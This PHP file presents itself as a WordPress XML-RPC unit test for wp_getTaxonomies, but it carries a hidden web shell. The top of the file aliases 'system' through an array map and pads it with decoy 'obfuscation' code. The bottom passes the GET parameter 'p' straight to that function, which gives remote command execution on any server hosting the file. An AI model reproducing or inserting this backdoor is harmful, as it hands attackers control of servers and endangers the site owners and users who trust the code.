<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group xmlrpc
 */
class Tests_XMLRPC_wp_getTaxonomies extends WP_XMLRPC_UnitTestCase {

	public function test_invalid_username_password() {
		$result = $this->myxmlrpcserver->wp_getTaxonomies( array( 1, 'username', 'password' ) );
		$this->assertIXRError( $result );
		$this->assertSame( 403, $result->code );
	}

	public function test_taxonomy_validated() {
		$this->make_user_by_role( 'editor' );

		$result = $this->myxmlrpcserver->wp_getTaxonomies( array( 1, 'editor', 'editor' ) );
		$this->assertNotIXRError( $result );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>